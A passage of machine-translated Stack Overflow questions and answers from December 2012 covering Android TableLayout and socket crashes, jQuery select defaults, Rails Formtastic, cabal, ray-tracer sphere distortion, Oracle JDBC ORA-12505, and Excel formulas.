        TextView rank = (TextView)findViewById(R.id.rank);
        rank.setText("RANK");
        TextView percentage = (TextView)findViewById(R.id.percentage);
        percentage.setText("PERCENTAGE");
        TextView score = (TextView)findViewById(R.id.score);
        score.setText("SCORE");

        TableRow rowHeader = (TableRow)findViewById(R.id.rowHeader);

        rowHeader.addView(rank);  //Line 39
        rowHeader.addView(percentage);
        rowHeader.addView(score);

        Button btn1 = (Button)findViewById(R.id.homeBtn);

        table.addView(rowHeader, new TableLayout.LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT));

        btn1.setOnClickListener(new OnClickListener() {
            public void onClick(View arg0) {
                Intent intent = new Intent(Highscores.this, MainMenu.class);
                startActivity(intent);
            }
        });
    }
} 
```

highscoresmain.xml

```
<TableLayout 
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:id = "@+id/tableLayout"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_weight="0"
    android:padding="5dp">

    <TableRow 
        android:layout_height="wrap_content"
        android:id="@+id/rowHeader">
        <TextView
            android:id="@+id/rank"
            android:layout_height="wrap_content" />
        <TextView
            android:id="@+id/percentage"
            android:layout_height="wrap_content" />
        <TextView
            android:id="@+id/score"
            android:layout_height="wrap_content" />
    </TableRow>
      </TableLayout> 
```

日志猫

```
12-19 06:03:36.960: E/AndroidRuntime(20130): FATAL EXCEPTION: main
12-19 06:03:36.960: E/AndroidRuntime(20130): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example.test/com.example.test.Highscores}: java.lang.IllegalStateException: The specified child already has a parent. You must call removeView() on the child's parent first.
12-19 06:03:36.960: E/AndroidRuntime(20130):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2059)
12-19 06:03:36.960: E/AndroidRuntime(20130):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2084)
12-19 06:03:36.960: E/AndroidRuntime(20130):    at android.app.ActivityThread.access$600(ActivityThread.java:130)
12-19 06:03:36.960: E/AndroidRuntime(20130):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1195)
12-19 06:03:36.960: E/AndroidRuntime(20130):    at android.os.Handler.dispatchMessage(Handler.java:99)
12-19 06:03:36.960: E/AndroidRuntime(20130):    at android.os.Looper.loop(Looper.java:137)
12-19 06:03:36.960: E/AndroidRuntime(20130):    at android.app.ActivityThread.main(ActivityThread.java:4745)
12-19 06:03:36.960: E/AndroidRuntime(20130):    at java.lang.reflect.Method.invokeNative(Native Method)
12-19 06:03:36.960: E/AndroidRuntime(20130):    at java.lang.reflect.Method.invoke(Method.java:511)
12-19 06:03:36.960: E/AndroidRuntime(20130):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
12-19 06:03:36.960: E/AndroidRuntime(20130):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
12-19 06:03:36.960: E/AndroidRuntime(20130):    at dalvik.system.NativeStart.main(Native Method)
12-19 06:03:36.960: E/AndroidRuntime(20130): Caused by: java.lang.IllegalStateException: The specified child already has a parent. You must call removeView() on the child's parent first.
12-19 06:03:36.960: E/AndroidRuntime(20130):    at android.view.ViewGroup.addViewInner(ViewGroup.java:3378)
12-19 06:03:36.960: E/AndroidRuntime(20130):    at android.view.ViewGroup.addView(ViewGroup.java:3249)
12-19 06:03:36.960: E/AndroidRuntime(20130):    at android.view.ViewGroup.addView(ViewGroup.java:3194)
12-19 06:03:36.960: E/AndroidRuntime(20130):    at android.view.ViewGroup.addView(ViewGroup.java:3170)
12-19 06:03:36.960: E/AndroidRuntime(20130):    at com.example.test.Highscores.onCreate(Highscores.java:39)
12-19 06:03:36.960: E/AndroidRuntime(20130):    at android.app.Activity.performCreate(Activity.java:5008)
12-19 06:03:36.960: E/AndroidRuntime(20130):    at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1079)
12-19 06:03:36.960: E/AndroidRuntime(20130):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2023)
12-19 06:03:36.960: E/AndroidRuntime(20130):    ... 11 more 
```

我想要的是一个简单的 3 列表，第 1 行的标题是“RANK”、“PERCENTAGE”和“SCORE”。稍后我将从 SQLite 数据库中提取另外 10 行，但之后我会解决这个问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T19:44:22.227

您的 xml 文件将被编辑；

我正在尝试用 XML 初始化 TableLayout，然后以编程方式填充它。这是我的 XML、java 和 LogCat 输出。

highscoresmain.xml

```
<TableLayout 
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:id = "@+id/tableLayout"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_weight="0"
    android:padding="5dp">

   </TableLayout> 
```

高分课程内容；

```
public class Highscores extends Activity {

    TableLayout table;
    TableRow rowHeader, row1, row2, row3, row4, row5, row6, row7, row8, row9, row10;
    TextView rank, percentage, score;
    Button btn1;    

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.highscoresmain);

        TableLayout table = (TableLayout)findViewById(R.id.tableLayout);

        TextView rank = new TextView(this);
        rank.setText("RANK");
        TextView percentage = new TextView(this);
        percentage.setText("PERCENTAGE");
        TextView score = new TextView(this);
        score.setText("SCORE");

        TableRow rowHeader = new TableRow(this);

        rowHeader.addView(rank);  //Line 39
        rowHeader.addView(percentage);
        rowHeader.addView(score);

        Button btn1 = (Button)findViewById(R.id.homeBtn);

        table.addView(rowHeader);

        btn1.setOnClickListener(new OnClickListener() {
            public void onClick(View arg0) {
                Intent intent = new Intent(Highscores.this, MainMenu.class);
                startActivity(intent);
            }
        });
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T19:30:19.570

您不需要以下代码：

```
TableRow rowHeader = (TableRow)findViewById(R.id.rowHeader);

rowHeader.addView(rank);  //Line 39
rowHeader.addView(percentage);
rowHeader.addView(score); 
```

`table.addView(rowHeader, new TableLayout.LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT));`

因为它们已经在布局中定义了。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-28T19:31:32.447

答案在你的`logcat`：

> java.lang.RuntimeException：无法启动活动 ComponentInfo{com.example.test/com.example.test.Highscores}：java.lang.IllegalStateException：指定的孩子已经有一个父母。您必须首先在孩子的父母上调用 removeView()。

`TextView`s 已经在 s 中，`TableRow`如果您想以编程方式填充它，只需删除 s 的所有子项`TableLayout`，在代码中创建它们，然后像​​刚才一样将它们添加到`Activity`s中。`onCreate`

祝你好运！

# jquery - Html 选择选项

> ID：14074634
> 
> 赞同：0
> 
> 时间：2012-12-28T19:26:28.890
> 
> 标签：jquery, html, spring-mvc

我有一个带有选项的列表框 itemValue 是一个字符串，并且它的显示顺序不准确。

我在 $(document).ready(function(){$("#item").val(1) 上使用并将项目的索引位置设置为列表中的第一个。默认情况下它设置为一个选项在基于字母顺序的列表中，这不是我想要的。

使用 JQuery 设置我想要的初始值索引有效，但是当我发布页面时，如果返回页面时页面上有任何错误，列表中项目的值将返回到我在 document.ready 中设置的值（） 功能。我怎么能克服这个。

**代码**；

**jQuery**

```
$(document).ready(function(){

        $("#skinColorId").val(1);
}); 
```

**html:**

数据来自数据库

```
<li>
<form:label for="skinColorId" path="skinColorId">Select Skin Color</form:label>     
<form:select path="skinColorId" id="skinColorId" title="Select Skin Color">
<form:options items = "${skinColor.skinColorList}" itemValue="colorCode" itemLabel="colorDesc"/>
</form:select>          
<form:errors path="skinColorId" class="errors"/><label class="colorPreviewer" id="skinColorPreviewer">color previewer</label>
</li> 
```

**数据样本：**

colorId|colorDesc|colorCode 155||选择颜色||#FFFFFF 156||Aqua||#00FFFF 157||海蓝宝石||#7FFFD4 158||Azure||#F0FFFF 159||米色||#F5F5DC 160||Bisque ||#FFE4C4 161||黑色||#000000 162||BlanchedAlmond||#FFEBCD

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T19:36:53.997

尝试使用“selected”设置默认值。

例如：

```
<option value="value" selected="selected">choose one</option> 
```

发布后...检查服务器的响应。

```
if (response.success) {
  //clear the items value by using ( $('#item').html('');})
else{
  //if response if failed... or some error occured
  //then have the same value for your option tag
} 
```

你真的不需要检查 $(document).ready 也不需要在 jquery 中设置值......

试试看...希望它有效:)...

# ruby-on-rails - rails formtastic 更复杂的关联

> ID：14074638
> 
> 赞同：0
> 
> 时间：2012-12-28T19:26:54.030
> 
> 标签：ruby-on-rails, formtastic

所以我有以下模型：

国城公司公司办公室

连接是这样的：

公司 -1:n-> 公司办公室 -> 城市 -> 国家

所以现在我有一个公司模型的表格。行之有效的是改变公司模型中的一切。但我想让用户输入公司的多个地址。

我试过：

```
= semantic_form_for current_user.company, :url => url do |f|
  = f.input :name, :label => 'Company name'
  = f.input :logo, :label => 'Company Logo'
  ...

  = f.inputs :for => :company_offices do |co, i|
    = co.select :city, :collection => City.all, :label => 'City'
    = co.input :street, :label => 'Street' 
```

这行不通。你会怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-29T01:10:52.487

你的模型中有嵌套属性吗？[看](http://api.rubyonrails.org/classes/ActiveRecord/NestedAttributes/ClassMethods.html)

# macos - 找不到 cabal 安装的软件包

> ID：14074639
> 
> 赞同：2
> 
> 时间：2012-12-28T19:26:54.527
> 
> 标签：macos, haskell, packages, cabal, ghc-pkg

我很茫然。我使用 OS X 10.8.2。

我能找到的唯一参考是：

*   > 4.1 刚装了包，现在找不到包了`

*   > 当您在全局安装包时会发生这种情况，而以前的
    > 包是在本地安装的。请注意，cabal-install
    > 默认安装在本地，“runhaskell Setup”命令
    > 默认安装在全局。

cabal 默认设置为本地安装。我没有改变这一点。Haskell 已在全球范围内安装。

```
$ cabal install pointfree
Resolving dependencies...
Configuring pointfree-1.0.4.3...
Building pointfree-1.0.4.3...
Preprocessing executable 'pointfree' for pointfree-1.0.4.3...
[1 of 7] Compiling Plugin.Pl.Common ( Plugin/Pl/Common.hs, dist/build/pointfree/pointfree-tmp/Plugin/Pl/Common.o )
[2 of 7] Compiling Plugin.Pl.Parser ( Plugin/Pl/Parser.hs, dist/build/pointfree/pointfree-tmp/Plugin/Pl/Parser.o )
[3 of 7] Compiling Plugin.Pl.PrettyPrinter ( Plugin/Pl/PrettyPrinter.hs, dist/build/pointfree/pointfree-tmp/Plugin/Pl/PrettyPrinter.o )
[4 of 7] Compiling Plugin.Pl.Transform ( Plugin/Pl/Transform.hs, dist/build/pointfree/pointfree-tmp/Plugin/Pl/Transform.o )
[5 of 7] Compiling Plugin.Pl.Rules  ( Plugin/Pl/Rules.hs, dist/build/pointfree/pointfree-tmp/Plugin/Pl/Rules.o )
[6 of 7] Compiling Plugin.Pl.Optimize ( Plugin/Pl/Optimize.hs, dist/build/pointfree/pointfree-tmp/Plugin/Pl/Optimize.o )
[7 of 7] Compiling Main             ( Main.hs, dist/build/pointfree/pointfree-tmp/Main.o )
Linking dist/build/pointfree/pointfree ...
Warning: No documentation was generated as this package does not contain a
library. Perhaps you want to use the --executables flag.
Installing executable(s) in
/Users/beoliver/Library/Haskell/ghc-7.4.2/lib/pointfree-1.0.4.3/bin
Installed pointfree-1.0.4.3
Updating documentation index /Users/beoliver/Library/Haskell/doc/index.html

$ cat ~/.bash_profile
export PATH="$HOME/Library/Haskell/bin:$PATH"

$ ls -l ~/Library/Haskell/bin/
total 24
lrwxr-xr-x  1 beoliver  staff  49 Dec 28 16:06 cabal -> ../ghc-7.4.2/lib/cabal-install-1.16.0.2/bin/cabal
lrwxr-xr-x  1 beoliver  staff  48 Dec 28 19:52 pointfree -> ../ghc-7.4.2/lib/pointfree-1.0.4.3/bin/pointfree
-rw-r--r--  1 beoliver  staff  66 Dec 28 19:53 x 
```

x是奇怪的...

```
$ cat ~/Library/Haskell/bin/x
(line 1, column 5):
unexpected "+"
expecting space or simple term 
```

唔

我检查`ghc-pkg list`但它不存在。所以看看它是否与`user`包裹一起。

```
$ ls ~/Library/Haskell/ghc-7.4.2/lib/
Cabal-1.16.0.3      cabal-install-1.16.0.2  pointfree-1.0.4.3

$ file pointfree-1.0.4.3/bin/pointfree 
pointfree-1.0.4.3/bin/pointfree: Mach-O 64-bit executable x86_64

$ ghc-pkg list --user
/Users/beoliver/.ghc/x86_64-darwin-7.4.2/package.conf.d
   Cabal-1.16.0.3
$ cabal --version
cabal-install version 1.16.0.2
using version 1.16.0.3 of the Cabal library 
```

我在这里错过了一面旗帜吗？我还需要建造它吗？

```
$ ghc-pkg check
Warning: haddock-interfaces: /Library/Haskell/ghc-7.4.2/lib/haskell-platform-2012.4.0.0/doc/html/haskell-platform.haddock doesn't exist or isn't a file
Warning: haddock-html: /Library/Haskell/ghc-7.4.2/lib/haskell-platform-2012.4.0.0/doc/html doesn't exist or isn't a directory
Warning: haddock-interfaces: /Library/Haskell/ghc-7.4.2/lib/GLUT-2.1.2.1/doc/html/GLUT.haddock doesn't exist or isn't a file 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T20:56:44.653

> 我检查`ghc-pkg list`但它不存在。

`ghc-pkg`只知道并关心已安装的库。`pointfree`是一个没有附带库的可执行文件，所以`ghc-pkg`不知道。

由于`$HOME/Library/Haskell/bin`在您的 中`PATH`，并且可执行文件链接到那里，您可以简单地从命令行运行它

```
$ pointfree "\f x y -> f y x"
flip 
```

（或类似的东西，我已经很久没有玩pointfree了）。

> x是奇数...

这看起来像是来自`parsec`. 不过，我不知道是什么将它写入该文件。

```
$ ghc-pkg check
Warning: haddock-interfaces: /Library/Haskell/ghc-7.4.2/lib/haskell-platform-2012.4.0.0/doc/html/haskell-platform.haddock doesn't exist or isn't a file
Warning: haddock-html: /Library/Haskell/ghc-7.4.2/lib/haskell-platform-2012.4.0.0/doc/html doesn't exist or isn't a directory
Warning: haddock-interfaces: /Library/Haskell/ghc-7.4.2/lib/GLUT-2.1.2.1/doc/html/GLUT.haddock doesn't exist or isn't a file 
```

似乎有什么东西踩到了你的黑线鳕，或者它们从一开始就没有正确安装。这*可能*表明存在实际问题，但如果您不想要本地文档，您可以忽略它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-10-19T20:22:50.747

我在`~/.cabal/bin/`.

# c++ - 为什么光线追踪器将球体渲染为椭圆？

> ID：14074643
> 
> 赞同：10
> 
> 时间：2012-12-28T19:27:07.570
> 
> 标签：c++, geometry, intersection, raytracing

在过去的几天里，我第一次破解了光线追踪器。但是，有一些怪癖困扰着我，我真的不知道如何解决。从一开始就存在的一个是场景中的球体形状——渲染时，它们实际上看起来像椭圆形。当然，场景中有透视，但最终的形状仍然看起来很奇怪。我附上了一个示例渲染，我遇到的问题在图像左下角的反射球上特别明显。

![示例图像](../Images/526acc783cc762cc78961a98d6218d3e.png)

我真的不知道是什么原因造成的。它可能是射线-球体相交代码，如下所示：

```
bool Sphere::intersect(Ray ray, glm::vec3& hitPoint) {
//Compute A, B and C coefficients
float a = glm::dot(ray.dir, ray.dir);
float b = 2.0 * glm::dot(ray.dir, ray.org-pos);
float c = glm::dot(ray.org-pos, ray.org-pos) - (rad * rad);

// Find discriminant
float disc = b * b - 4 * a * c;

// if discriminant is negative there are no real roots, so return
// false as ray misses sphere
if (disc < 0)
    return false;

// compute q
float distSqrt = sqrt(disc);
float q;
if (b < 0)
    q = (-b - distSqrt)/2.0;
else
    q = (-b + distSqrt)/2.0;

// compute t0 and t1
float t0 = q / a;
float t1 = c / q;

// make sure t0 is smaller than t1
if (t0 > t1) {
    // if t0 is bigger than t1 swap them around
    float temp = t0;
    t0 = t1;
    t1 = temp;
}

// if t1 is less than zero, the object is in the ray's negative direction
// and consequently the ray misses the sphere
if (t1 < 0)
    return false;

// if t0 is less than zero, the intersection point is at t1
if (t0 < 0) {
    hitPoint = ray.org + t1 * ray.dir;
    return true;
} else { // else the intersection point is at t0
    hitPoint = ray.org + t0 * ray.dir;
    return true;
    }
} 
```

或者它可能是另一回事。有人有想法吗？非常感谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-28T19:39:08.550

看起来您正在使用非常宽[的视野](http://en.wikipedia.org/wiki/Field_of_view_in_video_games)(FoV)。这产生了鱼眼镜头的效果，扭曲了画面，尤其是边缘。通常情况下，像 90 度（即任一方向 45 度）会给出合理的图像。

折射实际上看起来相当不错；它是倒置的，因为折射率很高。漂亮的图片在[这个问题](https://stackoverflow.com/questions/13386003/glsl-refraction-getting-mapped-upside-down)中。

# java - jdbc 连接到 oracle 10 XE

> ID：14074644
> 
> 赞同：1
> 
> 时间：2012-12-28T19:27:08.123
> 
> 标签：java, jdbc, oracle10g

> **可能重复：**
> [Java Oracle 本地主机连接错误 (ORA-12505)](https://stackoverflow.com/questions/6805705/java-oracle-localhost-connection-error-ora-12505)

当我尝试连接到 Oracle 10g Express Edition 时，它给了我错误：

```
java.sql.SQLException: Listener refused the connection with the following error:
ORA-12505, TNS:listener does not currently know of SID given in connect descriptor
The Connection descriptor used by the client was:
localhost:1521:xe 
```

我的示例代码：

```
 Class.forName("oracle.jdbc.OracleDriver");
    Connection connection = null;
    connection = DriverManager.getConnection("jdbc:oracle:thin:@localhost:1521:xe", "mk119", "mk119");
    Statement stmt = connection.createStatement(); 
```

在数据库中：

```
SQL> connect mk119
Enter password:
Connected.
SQL> ed
Wrote file afiedt.buf

  1* select sys_context('userenv', 'instance_name') from dual
SQL> /

SYS_CONTEXT('USERENV','INSTANCE_NAME')
----------------------------------------------------------------------

xe

SQL> 
```

请帮助我。

**编辑：堆栈跟踪：**

```
java.sql.SQLException: Listener refused the connection with the following error:
ORA-12505, TNS:listener does not currently know of SID given in connect descriptor
The Connection descriptor used by the client was:
localhost:1521:xe

        at oracle.jdbc.driver.DatabaseError.throwSqlException(DatabaseError.java:112)
        at oracle.jdbc.driver.DatabaseError.throwSqlException(DatabaseError.java:261)
        at oracle.jdbc.driver.T4CConnection.logon(T4CConnection.java:387)
        at oracle.jdbc.driver.PhysicalConnection.<init>(PhysicalConnection.java:414)
        at oracle.jdbc.driver.T4CConnection.<init>(T4CConnection.java:165)
        at oracle.jdbc.driver.T4CDriverExtension.getConnection(T4CDriverExtension.java:35)
        at oracle.jdbc.driver.OracleDriver.connect(OracleDriver.java:801)
        at java.sql.DriverManager.getConnection(DriverManager.java:579)
        at java.sql.DriverManager.getConnection(DriverManager.java:221)
        at fingerprint.DatabaseTest.main(DatabaseTest.java:14) 
```

**编辑：完整代码：**

```
import java.sql.*;

public class DatabaseTest {
    public static void main(String [] args){
        try{
            Class.forName("oracle.jdbc.OracleDriver");
            Connection connection = null;
            connection = DriverManager.getConnection("jdbc:oracle:thin:@localhost:1521:xe", "mk119", "mk119");
            Statement stmt = connection.createStatement();
            System.out.println("Connection created");
            stmt.close();
            connection.close();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T19:33:16.453

根据[此处](https://stackoverflow.com/questions/6805705/java-oracle-localhost-connection-error-ora-12505)提供的答案，检查以下内容（答案是相关的，可能是重复的问题）：

"检查\admin\NETWORK目录下的listener.ora文件是否有以下值：

```
XE =
  (DESCRIPTION =
    (ADDRESS = (PROTOCOL = TCP)(HOST = localhost)(PORT = 1521))
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = XE)
    )
  ) 
```

"

因此，请检查您的连接 url：主机、端口、sid，以确保其设置正确。

# excel-2010 - 我需要将最后 3 个非空白单元格除以前 3 个非空白单元格

> ID：14074645
> 
> 赞同：0
> 
> 时间：2012-12-28T19:27:08.853
> 
> 标签：excel-2010, nonblank

在我的 EXCEL 2010 电子表格中，我将 YTD 格式的最后三周总小时数除以前三周总小时数，其日期可能因开放日期而异。我必须每周为近 100 个不同的列更新我的公式，所以想要一些自动选择最后三个非零单元格的东西（注意这些单元格有一个公式可以让它们保持空白，直到我的“复制粘贴”页面获取数据日期范围）并将最后三个非零单元格除以前三个非零单元格。

```
10/28/2012       786     
11/4/2012        771        
11/11/2012       822           
11/18/2012       774            
11/25/2012       708        
12/2/2012        849        
12/9/2012        816       
12/16/2012       779        
12/23/2012                
12/30/2012                
YTD last 3 wks vs. 1st 3wks 195% 
```

以上是 1 位所有者的“小时摘要”电子表格的一小部分。对于许多业主来说，前三周不会在年初开始。几个月来我做了很多研究，但从未发现任何有效的方法。提前感谢您的任何建议或提示！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:59:59.593

如果您希望电子表格是动态的，我不确定如果不广泛使用 LOOKUP 表是否有可能 - 足够广泛以至于麻烦多于其价值。但是，如果您完全熟悉面向对象的编程（只要 VBA 符合该标签），您可能会尝试在宏套件中编写脚本。它非常彻底，并且比您想象的功能更全面。录制宏、执行一些任务并检查生成的代码是我学习语言的方式。

# android - Android Socket Client 未发送并自行关闭

> ID：14074650
> 
> 赞同：1
> 
> 时间：2012-12-28T19:27:15.857
> 
> 标签：android, sockets, client

我对 android 和 java 编程很陌生，我需要你的帮助。我想在我的 PC (Windows 7) 上创建一个 Android 客户端和一个服务器。我用 putty（一个模仿客户端的程序（没有编程错误^^））检查了我的服务器是否编程没有错误。因此我认识到我的服务器编程正确。

在这里你可以看到我运行良好的服务器：

```
 public class MyServer {
  public static void main (String[] args) throws IOException {

  ServerSocket serverSocket = null;

  try {
      serverSocket = new ServerSocket(4449);
      System.out.println("Listening on port: 4449");
  } catch (IOException e){
      System.err.println("Could not listen on port 4449.");
      System.exit(1);
  }

  Socket clientSocket = null;

  try {
      clientSocket = serverSocket.accept();
   System.out.println("Got connection.");
  } catch (IOException e) {
      System.err.println("Accept failed: 4449.");
      System.exit(1);
  }

  BufferedReader in = null;
  PrintWriter out = null;
  try {
      in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));

      out = new PrintWriter(clientSocket.getOutputStream(), true);
  } catch (IOException e) {
      System.err.println("Read failed");
      e.printStackTrace();
  }

  try {

      System.out.println("message: " + in.readLine());
      out.println("hab was bekommen!");
  } catch (IOException e) {
      System.err.println("Can't get a message from Client.");
      e.printStackTrace();

  }
  }
  } 
```

我还尝试为此服务器创建一个 Android 客户端，但我没有管理它。

这是我的主要活动：

```
public class AndroidClient extends Activity {

EditText textOut;
TextView textIn;
TextView problems;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_android_client);

    textOut = (EditText)findViewById(R.id.textout);
    Button buttonSend = (Button)findViewById(R.id.send);
    textIn = (TextView)findViewById(R.id.textin);
    problems = (TextView)findViewById(R.id.problems);
    buttonSend.setOnClickListener(buttonSendOnClickListener);
}

Button.OnClickListener buttonSendOnClickListener 
= new Button.OnClickListener() {

    @Override
    public void onClick(View arg0) {
        //TODO Auto-generated method stub
        Socket client = null;

        BufferedReader in = null;
        PrintWriter out = null;

        try {
            client = new Socket("192.168.2.107", 4449);
            in = new BufferedReader(new InputStreamReader(client.getInputStream()));
            out = new PrintWriter(client.getOutputStream(), true);
        } catch (UnknownHostException e) {
            problems.setText("Unknown host: 192.168.2.107");
        } catch (IOException e) {
            // System.out.println("No Input/Output.");
            problems.setText("No Input/Output.");
        }

        try {
            out.println("Hallo.");
            textIn.setText(in.readLine());
        } catch (IOException e) {
            problems.setText("Can't send/ get message.");
        }
    }   
};

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    // Inflate the menu; this adds items to the action bar if it is present.
    getMenuInflater().inflate(R.menu.activity_android_client, menu);
    return true;
}
    } 
```

到现在为止还挺好。当我在我的 android 智能手机上启动我的应用程序时，应用程序启动没有任何问题。然后我在我的 EditText 字段“textOut”中输入一些内容并按下“发送”按钮。然后我的屏幕变黑，应用程序自行关闭。我还在 AndroidManifest.xml 中粘贴了进入互联网和使用访问 Wifi 的权限。

我希望有人可以帮助我，因为我在这个问题上工作了 2 天，还没有找到任何解决方案。我主要使用这方面（http://android-er.blogspot.de/2011/01/simple-communication-using.html），当然还有其他方面，但我得到了大部分信息。此外，我的源代码中没有显示错误。

亲切的问候，

卢卡斯5060

编辑：这是我的 LogCat：

12-28 20:21:55.929: I/dalvikvm(698): threadid=3: 对信号 3 做出反应 12-28 20:21:56.039: I/dalvikvm(698): 将堆栈跟踪写入 '/data/anr/ traces.txt' 12-28 20:21:56.259: I/dalvikvm(698): threadid=3: 对信号 3 做出反应 12-28 20:21:56.299: I/dalvikvm(698): 将堆栈跟踪写入 '/ data/anr/traces.txt' 12-28 20:21:56.741: D/gralloc_goldfish(698): 没有检测到 GPU 仿真的仿真器。12-28 20:21:56.771: I/dalvikvm(698): threadid=3: 对信号 3 做出反应 12-28 20:21:56.789: I/dalvikvm(698): 将堆栈跟踪写入 '/data/anr/ traces.txt' 12-28 20:23:58.430: D/AndroidRuntime(698): 关闭 VM 12-28 20:23:58.430: W/dalvikvm(698): threadid=1: 线程退出未捕获异常（组= 0x409c01f8) 12-28 20:23:58.470: E/AndroidRuntime(698): 致命异常: main 12-28 20:23:58.470: E/AndroidRuntime(698): android.os。E/AndroidRuntime(698): at java.lang.reflect.Method.invokeNative(Native Method) 12-28 20:23:58.470: E/AndroidRuntime(698): at java.lang.reflect.Method.invoke(Method. java:511) 12-28 20:23:58.470: E/AndroidRuntime(698): 在 com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784) 12-28 20:23:58.470: E/AndroidRuntime(698): 在 com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551) 12-28 20:23:58.470: E/AndroidRuntime(698): 在 dalvik.system.NativeStart.main （本机方法）12-28 20：23：59.070：I/dalvikvm（698）：threadid = 3：对信号3做出反应12-28 20：23：59.100：I/dalvikvm（698）：将堆栈跟踪写入'/ data/anr/traces.txt' 12-28 20:24:02.420: I/Process(698): 发送信号。PID：698 SIG：9 在 java.lang.reflect.Method.invoke(Method.java:511) 12-28 20:23:58.470: E/AndroidRuntime(698): 在 com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit. java:784) 12-28 20:23:58.470: E/AndroidRuntime(698): 在 com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551) 12-28 20:23:58.470: E/ AndroidRuntime(698): 在 dalvik.system.NativeStart.main(Native Method) 12-28 20:23:59.070: I/dalvikvm(698): threadid=3: 对信号 3 作出反应 12-28 20:23:59.100: I / dalvikvm（698）：将堆栈跟踪写入'/data/anr/traces.txt' 12-28 20：24：02.420：I / Process（698）：发送信号。PID：698 SIG：9 在 java.lang.reflect.Method.invoke(Method.java:511) 12-28 20:23:58.470: E/AndroidRuntime(698): 在 com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit. java:784) 12-28 20:23:58.470: E/AndroidRuntime(698): 在 com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551) 12-28 20:23:58.470: E/ AndroidRuntime(698): 在 dalvik.system.NativeStart.main(Native Method) 12-28 20:23:59.070: I/dalvikvm(698): threadid=3: 对信号 3 作出反应 12-28 20:23:59.100: I / dalvikvm（698）：将堆栈跟踪写入'/data/anr/traces.txt' 12-28 20：24：02.420：I / Process（698）：发送信号。PID：698 SIG：9 ZygoteInit.main(ZygoteInit.java:551) 12-28 20:23:58.470: E/AndroidRuntime(698): at dalvik.system.NativeStart.main(Native Method) 12-28 20:23:59.070: I/dalvikvm (698): threadid=3: 对信号 3 做出反应 12-28 20:23:59.100: I/dalvikvm(698): 将堆栈跟踪写入 '/data/anr/traces.txt' 12-28 20:24:02.420 : I/Process(698): 发送信号。PID：698 SIG：9 ZygoteInit.main(ZygoteInit.java:551) 12-28 20:23:58.470: E/AndroidRuntime(698): at dalvik.system.NativeStart.main(Native Method) 12-28 20:23:59.070: I/dalvikvm (698): threadid=3: 对信号 3 做出反应 12-28 20:23:59.100: I/dalvikvm(698): 将堆栈跟踪写入 '/data/anr/traces.txt' 12-28 20:24:02.420 : I/Process(698): 发送信号。PID：698 SIG：9

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T20:41:40.340

好的，我的猜测是问题在于您在主 ui 线程中执行此操作，这远非推荐。相反，您应该做的是结帐`AsyncTask`，这是执行此类操作的首选方式（从文件或网络读取以及一堆其他东西）。

这比听起来容易，您需要做的是这样的事情（请注意，这只是为了让您了解它的外观）：

```
private class CreateSocketTask extends AsyncTask<String, Void, String> {

    @Override
    protected String doInBackground(String... urls) {
        //Do the socket stuff here...
    }

    @Override
    protected void onPostExecute(String result) {
        //This is called when doInBackground has finished
        //From here you'd call a method in the main ui class.
    }
} 
```

这是[安卓文档](http://developer.android.com/reference/android/os/AsyncTask.html)

网上有很多教程，所以你很快就会启动并运行。

# c# - 从 PhoneApplicationPage 的子类继承代码隐藏类

> ID：14074654
> 
> 赞同：2
> 
> 时间：2012-12-28T19:27:24.007
> 
> 标签：c#, xaml, subclass, code-behind, windows-phone-8

默认情况下，所有代码隐藏类都继承自`PhoneApplicationPage`. 我想创建一个子类`PhoneApplicationPage`并将其用作我的代码隐藏类的基础，如下所示：

```
namespace Test
{
    public partial class HistoryRemoverPage : PhoneApplicationPage
    {
        protected override void OnNavigatedTo
            (NavigationEventArgs e)
        {
            if (e.NavigationMode == NavigationMode.New)
                NavigationService.RemoveBackEntry();
        }
    }
}

namespace Test
{
    public partial class MainPage : HistoryRemoverPage 
    {
        public MainPage()
        {
            InitializeComponent();
        }
    }
} 
```

当我尝试编译我的应用程序时，出现以下错误：

> 错误 1 ​​'Test.MainPage' 的部分声明不能指定不同的基类

我相信这与以下声明有关`MainPage.xaml`，`PhoneApplicationPage`而不是我的子类：

> 电话：PhoneApplicationPage ...

但我不明白如何解决这个问题。有什么建议吗？
